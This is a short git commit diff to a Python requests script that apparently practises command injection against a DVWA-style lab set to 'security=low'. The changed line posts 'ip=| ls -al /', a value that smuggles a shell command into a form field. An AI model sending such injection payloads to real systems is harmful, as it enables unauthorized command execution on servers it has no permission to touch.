8232af7cb267d5b6f16a29ccc7337b8e4d481b0c
이준형 <miki3079@naver.com>
2023-07-25 18:41:42 +0900

    Update client.py

--- Cralwer/client.py
+++ Cralwer/client.py
@@ -6,7 +6,7 @@ headers = {
     "Content-Type": "application/x-www-form-urlencoded",
     "Cookie": "security=low; PHPSESSID=578aa57998b5d450439a63f1f749c406"
 }
-data = "ip=8.8.8.8+%7C+ls+-al+/&submit=submit"
+data = "ip=%7C+ls+-al+/&submit=submit"
 
 
 response = requests.post(url,data=data, headers=headers, verify=False)
